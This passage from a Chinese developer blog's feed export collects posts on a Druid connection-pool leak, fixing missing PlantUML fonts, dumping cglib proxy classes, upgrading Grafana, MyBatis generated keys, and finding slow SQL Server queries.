com.microsoft.sqlserver.jdbc.SQLServerConnection.connectionCommand(SQLServerConnection.java:1761)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.SQLServerConnection.setCatalog(SQLServerConnection.java:2063)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:750)</span><br><span class="line">at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">at com.alibaba.druid.proxy.jdbc.ConnectionProxyImpl.setCatalog(ConnectionProxyImpl.java:437)</span><br><span class="line">at com.alibaba.druid.pool.DruidPooledConnection.setCatalog(DruidPooledConnection.java:910)</span><br><span class="line">at com.atour.db.DynamicDataSource.getConnection(DynamicDataSource.java:143)</span><br><span class="line">at org.springframework.jdbc.datasource.DataSourceUtils.fetchConnection(DataSourceUtils.java:151)</span><br><span class="line">at org.springframework.jdbc.datasource.DataSourceUtils.doGetConnection(DataSourceUtils.java:115)</span><br><span class="line">at org.springframework.jdbc.datasource.DataSourceUtils.getConnection(DataSourceUtils.java:78)</span><br><span class="line">  ... 131 common frames omitted</span><br></pre></td></tr></table></figure><p>异常栈中关键的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Connection <span class="title">getConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">Connection connection = <span class="keyword">this</span>.determineTargetDataSource().getConnection();</span><br><span class="line"><span class="keyword">if</span>(dynamicInstance) &#123;</span><br><span class="line"><span class="comment">/**数据源创建到实例维度，获取连接之前设置数据库名*/</span></span><br><span class="line">    <span class="comment">// 这里setCatalog抛出了异常</span></span><br><span class="line">connection.setCatalog(databaseNameMap.get(DynamicDataSourceHolder.getDataSouce()));</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> connection;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先druid的配置没有设置<code>testOnBorrow</code>，拿到连接之后没有校验连接的有效性；</p><p>其次，由于分库太多（实例没有那么多），公司开发了中间件，动态切换数据库（就是上面的代码，一个druid实例默认就有一个Create线程和Destroy线程，有上百分库的时候，开销就相当大）。</p><p><strong>连接池的变化</strong></p><p>数据库刚开始断开的时候，业务线程拿到连接之后，执行<code>setCatalog</code>操作，此时会失败，然后没有catch关闭对应的数据库连接，就会占用druid的一个active count；</p><p>中间有创建连接Druid-ConnectionPool-C<code>reate-219971169</code>， 尝试创建，然后失败了。</p><p>后续数据库应该可以连上了，但是切换分库会有问题，也会占用druid的一个active count；</p><p>最终active count 会被占满，然后就无法创建连接，业务线程和连接创建线程都会一直等待。</p><h2 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h2><ul><li><p>必须设置获取连接的等待时间（maxWait) 和最大等待线程个数（maxWaitThreadCount）。</p></li><li><p>操作连接的时候，一定要在异常的情况下关闭连接，不要造成连接的泄露</p></li><li>可以设置druid的<ul><li><code>removeAbandoned</code> （是否强制关闭连接时长大于removeAbandonedTimeoutMillis的连接）</li><li><code>removeAbandonedTimeoutMillis</code> （一个连接从被连接到被关闭之间的最大生命周期）</li><li><code>logAbandoned</code> （强制关闭连接时是否记录日志）</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;现象&quot;&gt;&lt;a href=&quot;#现象&quot; class=&quot;headerlink&quot; title=&quot;现象&quot;&gt;&lt;/a&gt;现象&lt;/h2&gt;&lt;p&gt;当时数据库需要升级配置，已知中间会有闪断，按照之前的经验都是自动重连然后恢复。但是，这次tomcat的连接线程全部变成busy，导致应用不能
      
    
    </summary>
    
      <category term="druid" scheme="http://qsli.github.io/categories/druid/"/>
    
    
      <category term="druid" scheme="http://qsli.github.io/tags/druid/"/>
    
  </entry>
  
  <entry>
    <title>mediawiki-plantuml</title>
    <link href="http://qsli.github.io/2020/03/23/mediawiki-plantuml/"/>
    <id>http://qsli.github.io/2020/03/23/mediawiki-plantuml/</id>
    <published>2020-03-22T18:12:14.000Z</published>
    <updated>2020-03-22T18:12:14.564Z</updated>
    
    <content type="html"><![CDATA[<p>mediawiki的plantuml插件，在渲染中文的时候，发现文字丢了。</p><img src="/2020/03/23/mediawiki-plantuml/WeChatWorkScreenshot_0e466b8c-c8f5-48c4-bcab-45db7ddbf597.png"><p>方框里中文的说明都没有了，最后发现是缺少字体，这里mark下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install cjkuni-uming-fonts</span><br></pre></td></tr></table></figure><p>安装完字体就好了:</p><img src="/2020/03/23/mediawiki-plantuml/uml-13d5bec9d5aa4740c2198be487d50707-b9db094fe17005d80a48cfc93309f835.png">]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;mediawiki的plantuml插件，在渲染中文的时候，发现文字丢了。&lt;/p&gt;
&lt;img src=&quot;/2020/03/23/mediawiki-plantuml/WeChatWorkScreenshot_0e466b8c-c8f5-48c4-bcab-45db7ddbf
      
    
    </summary>
    
      <category term="mediawiki" scheme="http://qsli.github.io/categories/mediawiki/"/>
    
    
      <category term="plantuml" scheme="http://qsli.github.io/tags/plantuml/"/>
    
  </entry>
  
  <entry>
    <title>cglib-tips</title>
    <link href="http://qsli.github.io/2020/03/23/cglib-tips/"/>
    <id>http://qsli.github.io/2020/03/23/cglib-tips/</id>
    <published>2020-03-22T17:56:51.000Z</published>
    <updated>2020-03-22T17:56:51.374Z</updated>
    
    <content type="html"><![CDATA[<ul><li>设置debug的环境变量</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 该设置用于输出cglib动态代理产生的类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">System.setProperty(DebuggingClassWriter.DEBUG_LOCATION_PROPERTY, <span class="string">"/tmp/"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 该设置用于输出jdk动态代理产生的类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">System.getProperties().put(<span class="string">"sun.misc.ProxyGenerator.saveGeneratedFiles"</span>, <span class="string">"true"</span>);</span><br></pre></td></tr></table></figure><img src="/2020/03/23/cglib-tips/image-20200322181246078.png"><ul><li>或者使用 HSDB（Hotspot的debug工具）</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo java -classpath <span class="string">"/Library/Java/JavaVirtualMachines/jdk1.8.0_181.jdk/Contents/Home/lib/sa-jdi.jar"</span>  sun.jvm.hotspot.HSDB</span><br></pre></td></tr></table></figure><p>attach到指定的进程之后，选择class browser，就可以找到动态生成的类</p><img src="/2020/03/23/cglib-tips/image-20200322181636481.png"><p>点进去</p><img src="/2020/03/23/cglib-tips/image-20200322181729901.png"><p>会在当前目录生成对应的class文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  /tmp  tree</span><br><span class="line">.</span><br><span class="line">├── com</span><br><span class="line">│   └── air</span><br><span class="line">│       └── mvc</span><br><span class="line">│           └── SampleController$<span class="variable">$EnhancerBySpringCGLIB</span>$<span class="variable">$d680c039</span>.class</span><br></pre></td></tr></table></figure><p>对应的class文件就创建了，可以拖到idea或者其他的工具中查看，也可以查看类的继承关系</p><img src="/2020/03/23/cglib-tips/image-20200322181908616.png">]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;设置debug的环境变量&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span clas
      
    
    </summary>
    
      <category term="spring" scheme="http://qsli.github.io/categories/spring/"/>
    
    
      <category term="cglib" scheme="http://qsli.github.io/tags/cglib/"/>
    
  </entry>
  
  <entry>
    <title>升级grafana</title>
    <link href="http://qsli.github.io/2019/01/10/grafana-upgrade/"/>
    <id>http://qsli.github.io/2019/01/10/grafana-upgrade/</id>
    <published>2019-01-10T15:53:08.000Z</published>
    <updated>2019-01-10T15:53:08.311Z</updated>
    
    <content type="html"><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>目前的grafana版本过低，只有在状态变化的时候才发送报警的提醒</p><blockquote><p>Grafana sends notifications on state changes, so OK -&gt; Alerting, Alerting -&gt; OK, OK -&gt; NoData, etc</p></blockquote><p>高版本有work around可以解决：</p><blockquote><p>This is possible since 5.3 if you configure alert reminder at the same or lower interval as the alert rule.</p><p>It’s not exactly what’s described in this issue but its close enough that we won’t implement this feature.</p></blockquote><h2 id="当前配置信息"><a href="#当前配置信息" class="headerlink" title="当前配置信息"></a>当前配置信息</h2><p>当前版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd-devops-web yum.repos.d]$ sudo yum list installed | grep grafana</span><br><span class="line">grafana.x86_64                        4.6.3-1                        installed</span><br></pre></td></tr></table></figure><p>启动脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd-devops-web yum.repos.d]$ ps axu | grep grafana</span><br><span class="line">qisheng+ 24599  0.0  0.0 112660   976 pts/1    S+   14:10   0:00 grep --color=auto grafana</span><br><span class="line">grafana  28995  0.9  0.2 2414524 46008 ?       Ssl  Jan08  28:22 /usr/sbin/grafana-server --config=/etc/grafana/grafana.ini --pidfile=/var/run/grafana/grafana-server.pid cfg:default.paths.logs=/var/<span class="built_in">log</span>/grafana cfg:default.paths.data=/var/lib/grafana cfg:default.paths.plugins=/var/lib/grafana/plugins</span><br></pre></td></tr></table></figure><p>LDAP配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#################################### Auth LDAP ##########################</span></span><br><span class="line">[auth.ldap]</span><br><span class="line">enabled = <span class="literal">true</span></span><br><span class="line">config_file = /etc/grafana/ldap.toml</span><br><span class="line">allow_sign_up = <span class="literal">true</span></span><br></pre></td></tr></table></figure><h2 id="风险评估"><a href="#风险评估" class="headerlink" title="风险评估"></a>风险评估</h2><p>grafana只是作为展示层，升级对程序打点和数据收集无影响，而且grafana是后向兼容的；升级只会影响监控的查看和报警。</p><blockquote><p>We recommend everyone to upgrade Grafana often to stay up to date with the latest fixes and enhancements. In order make this a reality Grafana upgrades are backward compatible and the upgrade process is simple &amp; quick.</p></blockquote><h2 id="升级步骤"><a href="#升级步骤" class="headerlink" title="升级步骤"></a>升级步骤</h2><h3 id="备份配置文件"><a href="#备份配置文件" class="headerlink" title="备份配置文件"></a>备份配置文件</h3><ul><li>/etc/grafana/grafana.ini </li><li>/etc/grafana/ldap.toml</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd-devops-web yum.repos.d]$ sudo cp -p /etc/grafana/ldap.toml ~/</span><br><span class="line">[qisheng.li@yd-devops-web yum.repos.d]<span class="variable">$sudo</span> cp -p  /etc/grafana/grafana.ini  ~/</span><br></pre></td></tr></table></figure><h3 id="备份db"><a href="#备份db" class="headerlink" title="备份db"></a>备份db</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd-devops-web yum.repos.d]$ sudo cp -p /var/lib/grafana/grafana.db ~/</span><br></pre></td></tr></table></figure><h3 id="更新yum源"><a href="#更新yum源" class="headerlink" title="更新yum源"></a>更新yum源</h3><p>aliyun的yum的最新版本是<code>4.6.3</code>是我们当前使用的版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd-devops-web yum.repos.d]$ yum info grafana</span><br><span class="line">Loaded plugins: fastestmirror</span><br><span class="line">Loading mirror speeds from cached hostfile</span><br><span class="line"> * base: mirrors.aliyun.com</span><br><span class="line"> * extras: mirrors.aliyun.com</span><br><span class="line"> * updates: mirrors.aliyun.com</span><br><span class="line">Installed Packages</span><br><span class="line">Name        : grafana</span><br><span class="line">Arch        : x86_64</span><br><span class="line">Version     : 4.6.3</span><br><span class="line">Release     : 1</span><br><span class="line">Size        : 133 M</span><br><span class="line">Repo        : installed</span><br><span class="line">Summary     : Grafana</span><br><span class="line">URL         : https://grafana.com</span><br><span class="line">License     : <span class="string">"Apache 2.0"</span></span><br><span class="line">Description : Grafana</span><br></pre></td></tr></table></figure><p>添加grafana的源<a href="http://docs.grafana.org/installation/rpm/" rel="external nofollow noopener noreferrer" target="_blank">Installing on RPM-based Linux | Grafana Documentation</a></p><p>新建配置文件<code>/etc/yum.repos.d/grafana.repo</code></p><p>键入一下内容：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[grafana]</span></span><br><span class="line"><span class="attr">name</span>=grafana</span><br><span class="line"><span class="attr">baseurl</span>=https://packages.grafana.com/oss/rpm</span><br><span class="line"><span class="attr">repo_gpgcheck</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">enabled</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">gpgcheck</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">gpgkey</span>=https://packages.grafana.com/gpg.key</span><br><span class="line"><span class="attr">sslverify</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">sslcacert</span>=/etc/pki/tls/certs/ca-bundle.crt</span><br></pre></td></tr></table></figure><p>grafana也提供了beta的源，生产环境不建议使用。</p><p>再次查看yum信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd-devops-web yum.repos.d]$ yum info grafana</span><br><span class="line">Loaded plugins: fastestmirror</span><br><span class="line">Loading mirror speeds from cached hostfile</span><br><span class="line"> * base: mirrors.aliyun.com</span><br><span class="line"> * extras: mirrors.aliyun.com</span><br><span class="line"> * updates: mirrors.aliyun.com</span><br><span class="line">Installed Packages</span><br><span class="line">Name        : grafana</span><br><span class="line">Arch        : x86_64</span><br><span class="line">Version     : 4.6.3</span><br><span class="line">Release     : 1</span><br><span class="line">Size        : 133 M</span><br><span class="line">Repo        : installed</span><br><span class="line">Summary     : Grafana</span><br><span class="line">URL         : https://grafana.com</span><br><span class="line">License     : <span class="string">"Apache 2.0"</span></span><br><span class="line">Description : Grafana</span><br><span class="line"></span><br><span class="line">Available Packages</span><br><span class="line">Name        : grafana</span><br><span class="line">Arch        : x86_64</span><br><span class="line">Version     : 5.4.2</span><br><span class="line">Release     : 1</span><br><span class="line">Size        : 52 M</span><br><span class="line">Repo        : grafana</span><br><span class="line">Summary     : Grafana</span><br><span class="line">URL         : https://grafana.com</span><br><span class="line">License     : <span class="string">"Apache 2.0"</span></span><br><span class="line">Description : Grafana</span><br></pre></td></tr></table></figure><p>可以拿到<code>5.4.2</code>的信息了</p><h3 id="升级版本"><a href="#升级版本" class="headerlink" title="升级版本"></a>升级版本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd-devops-web yum.repos.d]$ sudo yum update grafana</span><br></pre></td></tr></table></figure><h2 id="配置reminder"><a href="#配置reminder" class="headerlink" title="配置reminder"></a>配置reminder</h2><p><img src="image-20190110234737778.png" alt="image-20190110234737778"></p><p>这样如果处于alert状态就会每隔30s报一次</p><p><img src="image-20190110234843905.png" alt="image-20190110234843905"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://github.com/grafana/grafana/issues/12356" rel="external nofollow noopener noreferrer" target="_blank">Send alert notification for every alert eval regardless of state · Issue #12356 · grafana/grafana</a></li><li><a href="http://docs.grafana.org/installation/upgrading/" rel="external nofollow noopener noreferrer" target="_blank">Upgrading | Grafana Documentation</a></li><li><a href="https://github.com/grafana/grafana/issues/7277" rel="external nofollow noopener noreferrer" target="_blank">[Question] Alert notify only once ? · Issue #7277 · grafana/grafana</a></li><li><a href="http://docs.grafana.org/installation/rpm/" rel="external nofollow noopener noreferrer" target="_blank">Installing on RPM-based Linux | Grafana Documentation</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;缘起&quot;&gt;&lt;a href=&quot;#缘起&quot; class=&quot;headerlink&quot; title=&quot;缘起&quot;&gt;&lt;/a&gt;缘起&lt;/h2&gt;&lt;p&gt;目前的grafana版本过低，只有在状态变化的时候才发送报警的提醒&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Grafana sends no
      
    
    </summary>
    
      <category term="linux" scheme="http://qsli.github.io/categories/linux/"/>
    
    
      <category term="grafana" scheme="http://qsli.github.io/tags/grafana/"/>
    
  </entry>
  
  <entry>
    <title>mybatis-get-generated-id</title>
    <link href="http://qsli.github.io/2019/01/06/mybatis-get-generated-id/"/>
    <id>http://qsli.github.io/2019/01/06/mybatis-get-generated-id/</id>
    <published>2019-01-06T09:41:12.000Z</published>
    <updated>2020-05-02T08:42:08.631Z</updated>
    
    <content type="html"><![CDATA[<h2 id="mybatis获取自增主键"><a href="#mybatis获取自增主键" class="headerlink" title="mybatis获取自增主键"></a>mybatis获取自增主键</h2><h3 id="使用useGeneratedKeys"><a href="#使用useGeneratedKeys" class="headerlink" title="使用useGeneratedKeys"></a>使用useGeneratedKeys</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">"add"</span> <span class="attr">parameterType</span>=<span class="string">"Staff"</span> <span class="attr">useGeneratedKeys</span>=<span class="string">"true"</span> <span class="attr">keyProperty</span>=<span class="string">"id"</span>&gt;</span></span><br><span class="line">  insert into Staff(name, age) values(#&#123;name&#125;, #&#123;age&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>useGeneratedKeys</code>既可以用于单条插入语句中获取自增主键，也可以用于多条语句中获取自增主键。</p><h3 id="使用-IDENTITY"><a href="#使用-IDENTITY" class="headerlink" title="使用@@IDENTITY"></a>使用@@IDENTITY</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">"add"</span> <span class="attr">parameterType</span>=<span class="string">"Staff"</span> <span class="attr">keyProperty</span>=<span class="string">"id"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">selectKey</span> <span class="attr">keyProperty</span>=<span class="string">"id"</span> <span class="attr">order</span>=<span class="string">"AFTER"</span> <span class="attr">resultType</span>=<span class="string">"java.lang.Integer"</span>&gt;</span></span><br><span class="line">select @@IDENTITY</span><br><span class="line">    <span class="tag">&lt;/<span class="name">selectKey</span>&gt;</span></span><br><span class="line">    insert into Staff(name, age) values(#&#123;name&#125;, #&#123;age&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br></pre></td></tr></table></figure><p>只支持一条插入时获取自增主键，而且跟数据库的支持有关.</p><h3 id="批量插入，获取生成的主键"><a href="#批量插入，获取生成的主键" class="headerlink" title="批量插入，获取生成的主键"></a>批量插入，获取生成的主键</h3><ul><li><p>Mybatis版本 &gt;= 3.3.1</p></li><li><p>Mapper.xml中使用list变量接受Dao中的集合</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">batchInsert</span><span class="params">(List&lt;XXX&gt; list)</span></span>;</span><br></pre></td></tr></table></figure><p>Mapper:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">"batchInsert"</span> <span class="attr">keyColumn</span>=<span class="string">"id"</span> <span class="attr">useGeneratedKeys</span>=<span class="string">"true"</span> <span class="attr">keyProperty</span>=<span class="string">"id"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">parameterType</span>=<span class="string">"xxx"</span>&gt;</span></span><br><span class="line">        insert into `xxx` (</span><br><span class="line">           xxx,</span><br><span class="line">   xxx</span><br><span class="line">        )</span><br><span class="line">        values</span><br><span class="line">        <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">"list"</span> <span class="attr">item</span>=<span class="string">"item"</span> <span class="attr">separator</span>=<span class="string">","</span>&gt;</span></span><br><span class="line">            (</span><br><span class="line">            #&#123;xx&#125;,</span><br><span class="line">            #&#123;xx&#125;</span><br><span class="line">            )</span><br><span class="line">        <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://www.cnblogs.com/fsjohnhuang/p/4078659.html" rel="external nofollow noopener noreferrer" target="_blank">MyBatis魔法堂：Insert操作详解（返回主键、批量插入） - ^_^肥仔John - 博客园</a></li><li><a href="https://buptubuntu.github.io/2017/07/16/Mybatis-Auto-Generate-Key/" rel="external nofollow noopener noreferrer" target="_blank">Mybatis Auto Generate Key | buptubuntu的博客</a></li><li><a href="http://www.mybatis.org/generator/configreference/generatedKey.html" rel="external nofollow noopener noreferrer" target="_blank">MyBatis Generator Core – The <generatedkey> Element</generatedkey></a></li><li><a href="https://mybatis.org/mybatis-dynamic-sql/docs/insert.html" rel="external nofollow noopener noreferrer" target="_blank">MyBatis Dynamic SQL – Insert Statements</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;mybatis获取自增主键&quot;&gt;&lt;a href=&quot;#mybatis获取自增主键&quot; class=&quot;headerlink&quot; title=&quot;mybatis获取自增主键&quot;&gt;&lt;/a&gt;mybatis获取自增主键&lt;/h2&gt;&lt;h3 id=&quot;使用useGeneratedKeys&quot;&gt;&lt;
      
    
    </summary>
    
      <category term="mybatis" scheme="http://qsli.github.io/categories/mybatis/"/>
    
    
      <category term="自增主键" scheme="http://qsli.github.io/tags/%E8%87%AA%E5%A2%9E%E4%B8%BB%E9%94%AE/"/>
    
  </entry>
  
  <entry>
    <title>sqlserver杀掉慢查询</title>
    <link href="http://qsli.github.io/2018/10/09/sqlserver-slow-killer/"/>
    <id>http://qsli.github.io/2018/10/09/sqlserver-slow-killer/</id>
    <published>2018-10-09T01:26:38.000Z</published>
    <updated>2018-10-09T01:26:38.776Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><p>查询慢查询的信息：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span></span><br><span class="line">    <span class="keyword">SUBSTRING</span>(qt.TEXT, (er.statement_start_offset/<span class="number">2</span>)+<span class="number">1</span>, ((<span class="keyword">CASE</span> er.statement_end_offset <span class="keyword">WHEN</span> <span class="number">-1</span> <span class="keyword">THEN</span> <span class="keyword">DATALENGTH</span>(qt.TEXT) <span class="keyword">ELSE</span> er.statement_end_offset <span class="keyword">END</span> - er.statement_start_offset)/<span class="number">2</span>)+<span class="number">1</span>) <span class="keyword">AS</span> query_sql,</span><br><span class="line">    er.session_id <span class="keyword">AS</span> pid,</span><br><span class="line">    er.status <span class="keyword">AS</span> <span class="keyword">status</span>,</span><br><span class="line">    er.command <span class="keyword">AS</span> command,</span><br><span class="line">    sp.hostname <span class="keyword">AS</span> hostname,</span><br><span class="line">    DB_NAME(sp.dbid) <span class="keyword">AS</span> db_name,</span><br><span class="line">    sp.program_name <span class="keyword">AS</span> program_name,</span><br><span class="line">    er.cpu_time <span class="keyword">AS</span> cpu_time,</span><br><span class="line">    er.total_elapsed_time <span class="keyword">AS</span> cost_time</span><br><span class="line"><span class="keyword">FROM</span> sys.sysprocesses <span class="keyword">AS</span> sp <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> sys.dm_exec_requests <span class="keyword">AS</span> er <span class="keyword">ON</span> sp.spid = er.session_id</span><br><span class="line"><span class="keyword">CROSS</span> <span class="keyword">APPLY</span> sys.dm_exec_sql_text(er.sql_handle) <span class="keyword">AS</span> qt</span><br><span class="line"><span class="keyword">WHERE</span> <span class="number">1</span> = <span class="keyword">CASE</span> <span class="keyword">WHEN</span> er.status <span class="keyword">IN</span> (<span class="string">'RUNNABLE'</span>, <span class="string">'SUSPENDED'</span>, <span class="string">'RUNNING'</span>) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">WHEN</span> er.status = <span class="string">'SLEEPING'</span> <span class="keyword">AND</span> sp.open_tran  &gt; <span class="number">0</span> <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span></span><br><span class="line"><span class="keyword">AND</span> er.command = <span class="string">'SELECT'</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> er.total_elapsed_time <span class="keyword">DESC</span></span><br></pre></td></tr></table></figure><p>查询的结果如下：</p><img 